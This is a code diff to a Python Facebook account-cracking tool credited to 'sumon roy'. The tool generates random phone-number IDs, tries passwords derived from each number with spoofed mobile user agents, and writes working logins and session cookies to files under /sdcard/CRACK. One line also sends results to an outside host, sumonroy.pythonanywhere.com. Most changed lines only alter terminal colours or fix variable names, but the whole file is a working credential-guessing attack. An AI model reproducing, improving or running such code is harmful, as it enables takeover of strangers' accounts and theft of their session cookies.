@@ -12,11 +12,6 @@ from requests.exceptions import ConnectionError
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime 
 from bs4 import BeautifulSoup
-from fake_useragent import UserAgent
-ua = UserAgent()
-def ugenX():
-    ualist = [ua.random for _ in range(50)]
-    return str(random.choice(ualist))
 ###-------[BASIC COLORS]-----------####
 reset = "\033[0m"
 red = "\033[1;31m"
@@ -51,23 +46,23 @@ def useragent_facebook():
             f'Mozilla/5.0 (Linux; {ubuntu}{random.randrange(10,22)}.{angka}; Android {random.randint(9,14)}; moto g stylus 5G ({tahun})) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 {linucx}/{str(random.randint(10,20))}.{str(random.randint(20,40))}.{str(random.randint(20,70))}.{str(random.randint(20,29))}.arm{arm}'
         ]))
 ###-------[LOGO]-----------####
-logo= f'''\033[1;97m---------------------------------------------------
- \033[1;97m[\033[1;92m•\033[1;97m] Author   : sumon roy
-\033[1;97m---------------------------------------------------'''
+logo= f'''\033[1;92m---------------------------------------------------
+ \033[1;92m[\033[1;92m•\033[1;92m] Author   : sumon roy
+\033[1;92m---------------------------------------------------'''
 ###-------[CLEAR TERMINAL]-----------####
 def clear():
     os.system("clear")
     print(logo)
 ###-------[LINE]-----------####
 def linex():
-    print(f"\033[1;97m--------------------------------------------------")
+    print(f"\033[1;92m--------------------------------------------------")
 ###-------[MSIN MENU]-----------####
 def menu():
     clear()
-    print(f" \033[1;97m[\033[1;92m01\033[1;97m] RANDOM NUMBER CLONING")
-    print(f" \033[1;97m[\033[1;92m02\033[1;97m] \033[1;32mCONTACT DEVELOPER")
+    print(f" \033[1;92m[\033[1;92m01\033[1;92m] RANDOM NUMBER CLONING")
+    print(f" \033[1;92m[\033[1;92m02\033[1;92m] \033[1;32mCONTACT DEVELOPER")
     linex()
-    younisxyz = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option : ")
+    younisxyz = input(f" \033[1;92m[\033[1;92m?\033[1;92m] Select Option : ")
     if younisxyz in ['1','01']:
         random_number()
     elif younisxyz in ['2','02']:
@@ -81,12 +76,12 @@ def menu():
 ###-------[DEF CLONING]-----------####
 def random_number():
     clear()
-    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Codes : \033[1;92m9987, 6787, 9009, 7233 ")
-    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Limit : \033[1;92m1000, 2000, 5000, 10000 ")
+    print(f" \033[1;92m[\033[1;92m•\033[1;92m] Codes : \033[1;92m9987, 6787, 9009, 7233 ")
+    print(f" \033[1;92m[\033[1;92m•\033[1;92m] Limit : \033[1;92m1000, 2000, 5000, 10000 ")
     linex()
-    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Code  :\033[1;92m ")
+    code = input(f" \033[1;92m[\033[1;92m?\033[1;92m] Enter Code  :\033[1;92m ")
     try:
-        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit :\033[1;92m "))
+        limit = int(input(f" \033[1;92m[\033[1;92m?\033[1;92m] Enter Limit :\033[1;92m "))
     except ValueError:
         limit = 5000
     for _ in range(limit):
@@ -102,15 +97,15 @@ def random_number():
         linex()
         for xyz in idz:
             uid = code+xyz
-            pww = [uid[:6],'57273200',uid[:8],uid] 
+            pww = [uid[:6],uid[:8],uid] 
          #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
             XYZ.submit(crack, uid, pww, total_idz)
     linex()
-    print(f" \033[1;97m[\033[1;92m!\033[1;97m] Process Completed ")
-    print(f" \033[1;97m[\033[1;92m•\033[1;97] Total Ok Accounts : \033[1;92m{str(len(oks))} ")
-    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Total Cp Accounts : \033[1;91m{str(len(cps))} ")
+    print(f" \033[1;92m[\033[1;92m!\033[1;92m] Process Completed ")
+    print(f" \033[1;92m[\033[1;92m•\033[1;97] Total Ok Accounts : \033[1;92m{str(len(oks))} ")
+    print(f" \033[1;92m[\033[1;92m•\033[1;92m] Total Cp Accounts : \033[1;91m{str(len(cps))} ")
     linex()
-    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter To Back ")
+    input(f" \033[1;92m[\033[1;91m!\033[1;92m] Press Enter To Back ")
     menu()
 ###-------[METHOD CRACK]-----------####
 def crack(uid, pww, total_idz):
@@ -119,7 +114,7 @@ def crack(uid, pww, total_idz):
     global cps
     global bkas
     x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
-    sys.stdout.write(f"\r{x}[SUMON]- {loop} \033[1;92m{len(oks)} \033[1;91m{len(cps)}             ")
+    sys.stdout.write(f"\r{x}[SUMON]- {loop} \033[1;92m{len(oks)} \033[1;91m{len(cps)}  ")
     sys.stdout.flush()
     try:
         for pw in pww:
@@ -191,9 +186,9 @@ def crack(uid, pww, total_idz):
                 if 'Photoshop' in res:
                     if xs_value and xs_value.rstrip(';').endswith('-1'):
                         print('\033[1;92m [CRACK-OK] '+user+' | '+pw+'')
-                        print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
+                        print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;92m"+kuki)
                         open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
-                        oks.append(ids)
+                        oks.append(uid)
                         break
                     else:
                         bkas.append(user)
@@ -202,9 +197,9 @@ def crack(uid, pww, total_idz):
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
                            print('\033[1;92m [CRACK-OK] '+user+' | '+pw+'')
-                           print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
+                           print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;92m"+kuki)
                            open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
-                           oks.append(ids)
+                           oks.append(uid)
                            break
                 else:
                     break
@@ -213,7 +208,7 @@ def crack(uid, pww, total_idz):
                 cid = coki[24:39]
                 #print('\033[1;91m [CRACK-CP] '+ids+' | '+pas+'')
                 open('/sdcard/CRACK/CP.txt', 'a').write( ids+' | '+pas+'\n')
-                cps.append(cid)
+                cps.append(uid)
                 break
             else:continue
         loop+=1
